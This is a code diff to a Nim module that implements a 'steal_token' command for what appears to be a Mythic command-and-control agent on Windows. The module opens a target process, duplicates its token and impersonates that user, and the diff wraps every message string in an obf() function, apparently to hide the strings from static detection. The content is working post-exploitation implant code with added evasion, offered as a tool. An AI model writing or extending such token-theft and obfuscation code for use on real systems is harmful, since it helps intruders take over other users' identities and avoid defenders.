@@ -1,8 +1,7 @@
-## Steal Token - Steals a primary token from another process
-
 import std/[json, strformat, strutils]
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 import token_manager
 
 when defined(windows):
@@ -18,7 +17,7 @@ when defined(windows):
       let pid = try:
         pidStr.strip(chars = {'"', ' '}).parseInt().uint32
       except:
-        return mythicError(taskId, &"Invalid PID: {pidStr}")
+        return mythicError(taskId, obf("Invalid PID format: ") & pidStr)
       
       debug &"[DEBUG] steal_token: PID={pid}"
       
@@ -26,14 +25,14 @@ when defined(windows):
       let processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid.DWORD)
       if processHandle == 0:
         let errorCode = GetLastError()
-        return mythicError(taskId, &"Failed to open process {pid}. Error code: {errorCode}")
+        return mythicError(taskId, obf("Failed to open process with PID ") & $pid & obf(". Error code: ") & $errorCode)
       
       # Open the process token - only TOKEN_DUPLICATE and TOKEN_QUERY needed
       var processToken: HANDLE = 0
       if OpenProcessToken(processHandle, TOKEN_DUPLICATE or TOKEN_QUERY, addr processToken) == 0:
         let errorCode = GetLastError()
         CloseHandle(processHandle)
-        return mythicError(taskId, &"Failed to open process token. Error code: {errorCode}")
+        return mythicError(taskId, obf("Failed to open process token for PID ") & $pid & obf(". Error code: ") & $errorCode)
       
       # Duplicate the token to create an impersonation token
       # Use hardcoded values to match Windows API exactly:
@@ -50,7 +49,7 @@ when defined(windows):
         let errorCode = GetLastError()
         CloseHandle(processToken)
         CloseHandle(processHandle)
-        return mythicError(taskId, &"Failed to duplicate token. Error code: {errorCode}")
+        return mythicError(taskId, obf("Failed to duplicate token. Error code: ") & $errorCode)
       
       # Clean up process handles (but keep impersonationToken)
       CloseHandle(processToken)
@@ -60,14 +59,14 @@ when defined(windows):
       if RevertToSelf() == 0:
         let errorCode = GetLastError()
         CloseHandle(impersonationToken)
-        return mythicError(taskId, &"Failed to revert to self. Error code: {errorCode}")
+        return mythicError(taskId, obf("Failed to revert to self. Error code: ") & $errorCode)
       
       # Use SetThreadToken (like oopsie) instead of ImpersonateLoggedOnUser
       # SetThreadToken works better with duplicated tokens
       if SetThreadToken(nil, impersonationToken) == 0:
         let errorCode = GetLastError()
         CloseHandle(impersonationToken)
-        return mythicError(taskId, &"Failed to set thread token. Error code: {errorCode}")
+        return mythicError(taskId, obf("Failed to set thread token. Error code: ") & $errorCode)
       
       # Store the token handle - we must keep it alive while impersonated
       setTokenHandle(impersonationToken)
@@ -78,15 +77,15 @@ when defined(windows):
       debug &"[DEBUG] Successfully stole token from PID {pid}: {newUser}"
       
       # Build response with callback data
-      return mythicCallback(taskId, &"Successfully impersonated {newUser} from PID {pid}", %*{
-        "impersonation_context": newUser
+      return mythicCallback(taskId, obf("Successfully impersonated ") & newUser & obf(" from PID ") & $pid, %*{
+        obf("impersonation_context"): newUser
       })
       
     except:
       let e = getCurrentException()
-      return mythicError(taskId, &"steal_token error: {e.msg}")
+      return mythicError(taskId, obf("steal_token error: ") & e.msg)
 
 else:
   # Unix placeholder
   proc stealToken*(taskId: string, params: JsonNode): JsonNode =
-    return mythicError(taskId, "steal_token is only available on Windows")
+    return mythicError(taskId, obf("steal_token is only available on Windows"))
